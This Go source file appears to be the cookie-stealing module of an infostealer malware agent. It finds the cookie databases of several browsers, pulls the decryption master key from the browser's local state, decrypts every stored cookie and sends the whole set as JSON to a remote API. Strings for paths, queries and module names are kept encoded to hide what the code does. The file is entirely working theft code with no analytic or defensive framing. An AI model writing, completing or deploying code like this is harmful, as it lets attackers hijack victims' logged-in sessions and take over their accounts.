package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"database/sql"
	"os"
	"path"
	"sync"

	_ "github.com/mattn/go-sqlite3"
)

func readCookies(p string, bp string) []vars.TCookie {
	var (
		res  []vars.TCookie
		rows *sql.Rows = nil
		db   *sql.DB   = nil
	)

	state := path.Join(bp, lib.Decode(vars.Path_localst))
	master, err := lib.GetMaster(state)
	if err != nil {
		return res
	}

	temp := lib.CopyTemp(p)
	if temp == "" {
		return res
	}

	db, err = sql.Open("sqlite3", temp)
	if err != nil {
		goto DONE
	}

	rows, err = db.Query(lib.Decode(vars.Query_cookie))
	if err != nil {
		lib.Print(vars.Msg_DumpError,
			lib.Decode(vars.Module_cookie), err.Error())
		goto DONE
	}

	for rows.Next() {
		var cookie vars.TCookie
		var enc []byte
		err := rows.Scan(&cookie.Domain, &cookie.Name, &cookie.Path, &enc, &cookie.Expires)
		if err != nil {
			continue
		}

		if len(enc) == 0 {
			continue
		}

		cookie.Value, err = lib.DecryptPass(string(enc), master)
		if err != nil {
			continue
		}

		res = append(res, cookie)
	}

DONE:
	if rows != nil {
		rows.Close()
	}

	if db != nil {
		db.Close()
	}

	lib.CleanTemp(temp)
	return res
}

func dumpCookies(b vars.Browser) ([]vars.TCookie, error) {
	var res []vars.TCookie
	dec := lib.Decode(b.Path)

	if dec == "" {
		return res, lib.NewErr(vars.Msg_BadEnc)
	}

	fp := path.Join(os.Getenv(lib.Decode(b.Prefix)), dec)
	cookies := lib.FindFiles(fp, lib.Decode(vars.Path_cookies), false)

	for _, c := range cookies {
		res = append(res, readCookies(c, fp)...)
	}

	for i := range res {
		res[i].From = lib.Decode(b.Name)
	}

	return res, nil
}

func GetCookies(wg *sync.WaitGroup) {
	for _, b := range vars.Browsers {
		cs, err := dumpCookies(b)
		if err != nil {
			lib.Print(vars.Msg_DumpError,
				lib.Decode(vars.Module_cookie), err.Error())
		}
		vars.Agent.Cookie = append(vars.Agent.Cookie, cs...)
	}

	lib.Print(vars.Msg_Entries,
		lib.Decode(vars.Module_cookie), len(vars.Agent.Cookie))
	err := api.SendJSON(lib.Decode(vars.Module_cookie), struct {
		Cookies []vars.TCookie `json:"ST_MAP$json.cookie_data$"`
	}{
		Cookies: vars.Agent.Cookie,
	})

	if err != nil {
		lib.Print(vars.Msg_FailSend,
			lib.Decode(vars.Module_cookie), err.Error())
	}

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_cookie))
	wg.Done()
}
